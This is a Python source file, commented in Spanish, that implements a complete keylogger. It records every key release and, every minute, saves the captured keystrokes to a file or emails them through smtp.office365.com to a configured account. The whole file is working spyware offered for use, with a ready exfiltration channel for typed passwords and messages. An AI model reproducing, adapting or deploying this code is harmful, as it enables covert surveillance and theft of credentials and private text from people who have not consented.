import keyboard  # para el keylogs
import smtplib  # para el envío de email utilizando el protocolo SMTP (gmail)

from threading import Timer
# Timer: temporizador sirve para hacer que un método se ejecute después de un "intervalo" de tiempo.
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60  # en segundos, 60 significa 1 minuto y así sucesivamente

EMAIL_ADDRESS = "email@proveedor_email.dominio"
EMAIL_PASSWORD = "password"


class Keylogger:
    def __init__(self, interval, report_method="email"):
        # Se pasa SEND_REPORT_EVERY al intervalo
        self.interval = interval
        self.report_method = report_method

        # esta es la variable (string) contiene el registro de todas las pulsaciones de teclas self.interval
        self.log = ""

        # registro de fechas de inicio y finalización
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        Esta devolución de llamada se invoca cada vez que ocurre un evento de teclado
        (es decir, cuando se suelta una clave)
        """
        name = event.name
        if len(name) > 1:
            #  no es un carácter, tecla especial (por ejemplo, ctrl, alt, etc.), mayúscula con []
            if name == "space":
                # " " en lugar de "espacio"
                name = " "
            elif name == "enter":
                # se agrega una nueva línea cada vez que se presiona ENTER
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # reemplazamiento espacios con guiones bajos
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finalmente, se agrega el nombre de la clave a nuestra variable global self.log
        self.log += name

    def update_filename(self):
        # construcción del nombre del archivo para ser identificado por las fechas de inicio y finalización
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """Este método crea un archivo de registro en el directorio actual que contiene
        los registros de teclas actuales en la variable self.log"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # escribe los registros de teclas en el archivo
            print(self.log, file=f)
        print(f"[+] Guardado: {self.filename}.txt")

    def prepare_mail(self, message):
        """Función de utilidad para construir un MIMEMultipart a partir de un texto
        Crea una versión HTML y una versión de texto para ser enviado como un correo electrónico"""
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        # párrafo simple, posible para su edición
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        # después de enviar el correo, se convierte nuevamente como string
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        # gestiona una conexión a un servidor SMTP - Microsoft365, Outlook, Hotmail y live.com
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        # conectarse al servidor SMTP en modo TLS (por seguridad)
        server.starttls()
        # inicio de sesión en la cuenta de email
        server.login(email, password)
        # enviar el mensaje  después de la preparación
        server.sendmail(email, email, self.prepare_mail(message))
        # término de la sesión
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Enviado a {email}, que contiene:  {message}")

    def report(self):
        """
        Esta función se llama cada self.interval. Básicamente, envía registros de teclas y
        restablece la variable self.log
        """
        if self.log:
            # si hay algo en el registro, se reporta
            self.end_dt = datetime.now()
            # updating de self.filename
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
                # Si no quieres que se imprima en la consola, comenta la siguiente línea
                print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # establece el hilo como daemon (muere cuando el hilo principal termina)
        timer.daemon = True
        # iniciar el temporizador
        timer.start()

    def start(self):
        # registro la fecha y hora de inicio
        self.start_dt = datetime.now()
        # iniciar el keylogger
        keyboard.on_release(callback=self.callback)
        # empezar a informar de keylogs
        self.report()
        # creación de mensajes sencillos
        print(f"{datetime.now()} - Started keylogger")
        # bloquear el hilo actual, esperar hasta que se presione CTRL+C
        keyboard.wait()


if __name__ == "__main__":
    # Para enviar un keylogger a tu correo electrónico:
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")

    # Keylogger a archivo local
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()